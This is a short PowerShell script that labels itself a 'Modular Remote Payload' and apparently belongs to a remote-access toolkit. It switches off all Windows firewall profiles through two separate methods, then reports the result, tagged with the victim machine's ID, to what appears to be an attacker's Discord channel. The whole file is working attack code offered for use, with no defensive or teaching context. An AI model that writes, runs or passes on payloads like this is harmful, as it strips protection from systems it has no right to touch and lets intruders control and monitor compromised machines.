# ============================================================
# Disable Firewall for Windows - Modular Remote Payload
# ============================================================

$sysid = Get-SystemID

try {
    # Disable all firewall profiles
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    
    # Alternative method using netsh
    netsh advfirewall set allprofiles state off 2>$null
    
    Send-Discord "🔥 **Firewall Disabled on $sysid**`n• All profiles: OFF"
} catch {
    Send-Discord "❌ Firewall disable failed on $sysid: $($_.Exception.Message)"
}
